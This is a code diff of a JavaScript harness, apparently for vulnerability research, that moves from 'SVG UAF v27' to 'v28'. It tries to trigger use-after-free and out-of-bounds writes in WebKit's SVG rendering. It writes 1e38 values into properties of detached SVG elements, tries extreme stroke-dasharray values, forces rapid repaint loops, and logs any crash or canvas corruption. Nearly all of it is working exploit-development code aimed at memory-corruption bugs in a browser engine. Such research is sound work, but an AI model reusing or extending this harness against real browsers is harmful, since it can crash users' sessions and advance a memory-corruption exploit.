-    // Find changes
-    var changes = [];
-    for (var j = 0; j < after.data.length; j += 4) {
-      var px = j/4;
-      if (after.data[j]   !== base.data[j]   ||
-          after.data[j+1] !== base.data[j+1] ||
-          after.data[j+2] !== base.data[j+2]) {
-        if (changes.length < 20) {
-          changes.push({
-            px: px,
-            before: [base.data[j], base.data[j+1], base.data[j+2]],
-            after:  [after.data[j], after.data[j+1], after.data[j+2]]
-          });
-        }
-      }
-    }
-    log('  changed pixels: ' + changes.length + ' (showing first 5)', changes.length > 0 ? 'inf' : 'ok');
-    for (var k = 0; k < Math.min(5, changes.length); k++) {
-      var c = changes[k];
-      log('    px=' + c.px + ' before=(' + c.before + ') after=(' + c.after + ')', 'inf');
-    }
-    if (changes.length === 0) {
-      log('  no pixels changed - 1e38 element fully clipped', 'ok');
-    }
+  var pl = null;
+  try {
+    pl = path.pathLength;
+    log('  path.pathLength type: ' + typeof pl, 'ok');
+    log('  path.pathLength.baseVal = ' + (pl ? pl.baseVal : '?'), 'ok');
+  } catch(e) { log('  path.pathLength threw: ' + e, 'bad'); }
+
+  if (!pl) { log('  [!] pathLength not accessible', 'bad'); document.body.removeChild(outer); if (!q) dis(false); return {}; }
+
+  // UAF write: remove path, write 1e38 into pathLength.baseVal, re-add
+  var bv_pl = pl; // SVGAnimatedNumber - the property itself
+  log('  removing path from outer...', 'inf');
+  path.remove();
+  await micro();
+
+  var wrote = false;
+  try {
+    bv_pl.baseVal = BIG;
+    var rb = bv_pl.baseVal;
+    wrote = (rb > 1e30);
+    log('  after remove: pathLength.baseVal = ' + rb + ' wrote=' + wrote, wrote ? 'ok' : 'bad');
+  } catch(e) { log('  pathLength.baseVal write threw: ' + e, 'bad'); }
+
+  // Re-add with pathLength=1e38 and various dasharray configs
+  outer.appendChild(path);
+  await raf();
+
+  log('  path re-added with pathLength=1e38', 'ok');
+  log('  path.pathLength.baseVal after re-add: ' + (path.pathLength ? path.pathLength.baseVal : '?'), 'inf');
+
+  // Now test: does changing dasharray trigger crash?
+  var dashTests = [
+    '10,5',           // normal
+    '1,1',            // fine-grain
+    '0.001,0.001',    // very small (maximizes iteration count)
+    '1000000,1',      // huge on: scale * 1e38 iterations?
+    '1e38,1',         // dasharray value itself = 1e38
+  ];
+
+  for (var i = 0; i < dashTests.length; i++) {
+    var da = dashTests[i];
+    try {
+      path.setAttribute('stroke-dasharray', da);
+      await raf();
+      var tl = path.getTotalLength();
+      log('  dasharray=' + da + ' getTotalLength=' + tl, 'ok');
+    } catch(e) { log('  dasharray=' + da + ' threw: ' + e, 'bad'); }
   }
 
+  document.body.removeChild(outer);
   if (!q) dis(false);
-  return { drawOk: drawOk };
+  return { wrote: wrote };
 }
 
-// TIL: tile thrash - rapid draw into many canvases, cross-canvas corruption
-async function runTIL(q) {
-  if (!q) { dis(true); sep(); log('TIL: tile thrash - rapid draw across many canvases', 'inf'); sep(); }
+/*
+ * FRC: force-repaint loop - aggressively trigger WebKit's paint+composite cycle
+ *      with multiple 1e38 elements across different contexts simultaneously.
+ *
+ * GOAL: stress-test the paint invalidation system with multiple concurrent
+ *       1e38 elements forcing geometry/filter recalculation repeatedly.
+ *       Any OOB write into painter scratch buffers may cause:
+ *         - WebKit process crash (render process abort)
+ *         - Pixel corruption visible via canvas readback
+ *         - Silent garbage values in layout (different crashes later)
+ */
+async function runFRC(q) {
+  if (!q) { dis(true); sep(); log('FRC: force-repaint with multiple concurrent 1e38 elements', 'inf'); sep(); }
 
-  var N = 20;
-  var SIZE = 64;
-  log('[*] creating ' + N + ' canvases, filling with sentinel, drawing attack into each', 'ok');
+  var SVGs = [];
+  var N = 5;
+  var crashed = false;
 
-  var canvases = [];
-  var ctxs = [];
-  var sentinels = [];
-
+  // Create N SVGs each with a 1e38 element
   for (var i = 0; i < N; i++) {
-    var c = document.createElement('canvas');
-    c.width = SIZE; c.height = SIZE;
-    c.style.cssText = 'position:fixed;opacity:0;pointer-events:none';
-    document.body.appendChild(c);
-    var cx = c.getContext('2d');
-    canvases.push(c);
-    ctxs.push(cx);
+    var svg = document.createElementNS(SVG_NS, 'svg');
+    svg.setAttribute('width', '200'); svg.setAttribute('height', '200');
+    svg.style.cssText = 'position:fixed;opacity:0.01;pointer-events:none;top:' + (i*10) + 'px;left:' + (i*10) + 'px';
 
-    // Fill with unique sentinel per canvas
-    cx.fillStyle = 'rgb(' + (200 + i % 50) + ',0,' + (i * 5 % 256) + ')';
-    cx.fillRect(0, 0, SIZE, SIZE);
-
-    var px = cx.getImageData(0, 0, 1, 1);
-    sentinels.push([px.data[0], px.data[1], px.data[2]]);
+    var rect = document.createElementNS(SVG_NS, 'rect');
+    rect.setAttribute('x', '0'); rect.setAttribute('y', '0');
+    rect.setAttribute('width', '50'); rect.setAttribute('height', '50');
+    rect.setAttribute('fill', 'hsl(' + (i * 72) + ',100%,50%)');
+    svg.appendChild(rect);
+    document.body.appendChild(svg);
+    SVGs.push({ svg: svg, rect: rect });
   }
-
-  log('  all ' + N + ' canvases set with unique colors', 'ok');
-
-  // Draw attack into canvas[0] only
-  var attack = makeBigSVG();
-  var drawOk = false;
-  try {
-    document.body.appendChild(attack.svg);
-    await raf();
-    ctxs[0].drawImage(attack.svg, 0, 0);
-    drawOk = true;
-    document.body.removeChild(attack.svg);
-  } catch(e) {
-    log('  drawImage threw: ' + e, 'bad');
-    try { document.body.removeChild(attack.svg); } catch(e2) {}
-  }
-
   await raf();
 
-  // Check: did any OTHER canvas get corrupted?
-  var corrupted = [];
-  for (var j = 1; j < N; j++) { // start from 1 (skip attack canvas)
-    var px2 = ctxs[j].getImageData(0, 0, 1, 1);
-    var s = sentinels[j];
-    if (px2.data[0] !== s[0] || px2.data[1] !== s[1] || px2.data[2] !== s[2]) {
-      corrupted.push({ idx: j, expected: s, got: [px2.data[0], px2.data[1], px2.data[2]] });
+  // Inject 1e38 into all rects simultaneously
+  for (var j = 0; j < SVGs.length; j++) {
+    var obj = SVGs[j];
+    try {
+      var bvW = obj.rect.width ? obj.rect.width.baseVal : null;
+      var bvH = obj.rect.height ? obj.rect.height.baseVal : null;
+      obj.rect.remove();
+      if (bvW) bvW.value = BIG;
+      if (bvH) bvH.value = BIG;
+      obj.svg.appendChild(obj.rect);
+    } catch(e) { log('  inject ' + j + ' threw: ' + e, 'bad'); }
+  }
+  await raf();
+  log('  all ' + N + ' SVGs have 1e38 width/height rects', 'ok');
+
+  // Force rapid repaints: animate position to trigger invalidation
+  var ROUNDS = 10;
+  log('  running ' + ROUNDS + ' rapid repaint rounds...', 'inf');
+  try {
+    for (var round = 0; round < ROUNDS; round++) {
+      for (var k = 0; k < SVGs.length; k++) {
+        SVGs[k].svg.style.left = (k * 10 + round) + 'px';
+      }
+      await raf();
     }
+    log('  repaint loop survived: rounds=' + ROUNDS + ' crashed=false', 'ok');
+  } catch(e) {
+    log('  repaint loop threw: ' + e, 'bad');
+    crashed = true;
   }
 
-  log('  cross-canvas corruption: ' + corrupted.length + ' canvases affected (expect 0)', corrupted.length > 0 ? 'bad' : 'ok');
-  for (var k = 0; k < corrupted.length; k++) {
-    var co = corrupted[k];
-    log('  [!!] canvas[' + co.idx + '] corrupted: expected=' + co.expected + ' got=' + co.got, 'bad');
+  // Also try getBoundingClientRect on all (triggers layout for each)
+  for (var m = 0; m < SVGs.length; m++) {
+    try {
+      var bb = SVGs[m].rect.getBoundingClientRect();
+      log('  rect[' + m + '] bbox: w=' + bb.width.toFixed(0) + ' h=' + bb.height.toFixed(0), 'inf');
+    } catch(e) { log('  getBBox[' + m + '] threw: ' + e, 'bad'); }
   }
 
   // Cleanup
-  for (var m = 0; m < N; m++) { document.body.removeChild(canvases[m]); }
+  for (var n = 0; n < SVGs.length; n++) {
+    try { document.body.removeChild(SVGs[n].svg); } catch(e2) {}
+  }
 
-  log('[*] TIL: crossCorruption=' + (corrupted.length > 0), corrupted.length > 0 ? 'bad' : 'ok');
+  log('[*] FRC: crashed=' + crashed, crashed ? 'bad' : 'ok');
   if (!q) dis(false);
-  return { crossCorruption: corrupted.length > 0, count: corrupted.length };
-}
-
-// COR: two canvases - draw attack into A, check if B (victim) gets corrupted
-async function runCOR(q) {
-  if (!q) { dis(true); sep(); log('COR: two-canvas OOB test - attack canvas vs victim canvas', 'inf'); sep(); }
-
-  // VICTIM canvas - filled with known pattern
-  var victim = document.createElement('canvas');
-  victim.width = 256; victim.height = 256;
-  victim.style.cssText = 'position:fixed;opacity:0;pointer-events:none';
-  document.body.appendChild(victim);
-  var vctx = victim.getContext('2d');
-
-  // Fill victim with sentinel: all pixels = (77, 88, 99, 255)
-  var SENT_R = 77; var SENT_G = 88; var SENT_B = 99;
-  vctx.fillStyle = 'rgb(' + SENT_R + ',' + SENT_G + ',' + SENT_B + ')';
-  vctx.fillRect(0, 0, 256, 256);
-  var vbase = vctx.getImageData(0, 0, 256, 256);
-  log('  VICTIM canvas filled with rgb(' + SENT_R + ',' + SENT_G + ',' + SENT_B + ')', 'ok');
-
-  // ATTACKER canvas - draw attack SVG into this one
-  var attacker = document.createElement('canvas');
-  attacker.width = 256; attacker.height = 256;
-  attacker.style.cssText = 'position:fixed;opacity:0;pointer-events:none';
-  document.body.appendChild(attacker);
-  var actx = attacker.getContext('2d');
-
-  actx.fillStyle = 'black';
-  actx.fillRect(0, 0, 256, 256);
-
-  var attack = makeBigSVG();
-  var drawOk = false;
-  try {
-    document.body.appendChild(attack.svg);
-    await raf();
-    actx.drawImage(attack.svg, 0, 0);
-    drawOk = true;
-    document.body.removeChild(attack.svg);
-    log('  ATTACKER: drawImage(attack SVG) OK', 'ok');
-  } catch(e) {
-    log('  ATTACKER: drawImage threw: ' + e, 'bad');
-    try { document.body.removeChild(attack.svg); } catch(e2) {}
-  }
-
-  await raf();
-
-  // Read VICTIM - check for corruption
-  var vafter = vctx.getImageData(0, 0, 256, 256);
-  var victimCorrupted = 0;
-  for (var i = 0; i < vafter.data.length; i += 4) {
-    if (vafter.data[i] !== SENT_R || vafter.data[i+1] !== SENT_G || vafter.data[i+2] !== SENT_B) {
-      victimCorrupted++;
-    }
-  }
-  log('  VICTIM pixels corrupted: ' + victimCorrupted + '/' + (256*256), victimCorrupted > 0 ? 'bad' : 'ok');
-
-  if (victimCorrupted > 0) {
-    log('  [!!] OOB WRITE CONFIRMED: attacker drawImage corrupted victim canvas!', 'bad');
-    log('  [!!] drawImage with 1e38-coord element writes outside its canvas buffer!', 'bad');
-  } else {
-    log('  no cross-canvas corruption (WebKit clamped the 1e38 coords)', 'ok');
-  }
-
-  document.body.removeChild(victim);
-  document.body.removeChild(attacker);
-
-  log('[*] COR: victimCorrupted=' + (victimCorrupted > 0) + ' count=' + victimCorrupted, victimCorrupted > 0 ? 'bad' : 'ok');
-  if (!q) dis(false);
-  return { victimCorrupted: victimCorrupted > 0, count: victimCorrupted };
+  return { crashed: crashed };
 }
 
 // RUN ALL
 async function runAll() {
   dis(true); clearLog(); sep();
-  log('SVG UAF v27 - canvas drawImage OOB via 1e38 coordinate injection', 'inf');
+  log('SVG UAF v28 - feDisplacementMap UAF + hit-test OOB + dasharray overflow + repaint stress', 'inf');
   sep();
 
   var results = {};
   var tests = [
-    ['CDI_drawImage',   runCDI],
-    ['BLB_blob',        runBLB],
-    ['OFS_offset_scan', runOFS],
-    ['TIL_tile_thrash', runTIL],
-    ['COR_two_canvas',  runCOR]
+    ['FLT_feDisp_UAF',    runFLT],
+    ['EFP_elementFromPt', runEFP],
+    ['CHK_intersection',  runCHK],
+    ['DSH_dasharray',     runDSH],
+    ['FRC_repaint_stress', runFRC]
   ];
 
   for (var i = 0; i < tests.length; i++) {
@@ -523,21 +634,22 @@ async function runAll() {
   }
 
   sep();
-  log('SUMMARY v27', 'inf');
+  log('SUMMARY v28', 'inf');
   sep();
   var keys = Object.keys(results);
   for (var ki = 0; ki < keys.length; ki++) {
     var k = keys[ki];
     var r = results[k];
     if (!r) { log('  ' + k + ': ERROR', 'bad'); continue; }
-    var v = r.victimCorrupted !== undefined ? r.victimCorrupted :
-            r.crossCorruption !== undefined ? r.crossCorruption :
-            r.drawOk !== undefined ? r.drawOk : '?';
-    log('  ' + k + ': ' + v, v === true && k !== 'CDI_drawImage' && k !== 'BLB_blob' ? 'bad' : 'dim');
+    if (r.writeOk !== undefined) log('  ' + k + ': writeOk=' + r.writeOk + ' crashed=' + r.crashed, r.crashed ? 'bad' : 'ok');
+    else if (r.crashed !== undefined) log('  ' + k + ': crashed=' + r.crashed, r.crashed ? 'bad' : 'ok');
+    else if (r.wrote !== undefined) log('  ' + k + ': wrote=' + r.wrote, 'ok');
+    else log('  ' + k + ': ran', 'ok');
   }
   log('');
-  log('  KEY: victim/cross corrupted=true -> OOB write into adjacent canvas buffer', 'inf');
-  log('       drawImage ok=true -> SVG rasterized (check OFS for which pixels)', 'inf');
+  log('  KEY: FLT writeOk=true -> scale.baseVal UAF confirmed on SVGAnimatedNumber', 'inf');
+  log('       ANY crashed=true -> rasterizer hit OOB on 1e38 input', 'inf');
+  log('       DSH wrote=true + repaint no crash -> need filter rasterizer path', 'inf');
   sep();
   dis(false);
 }
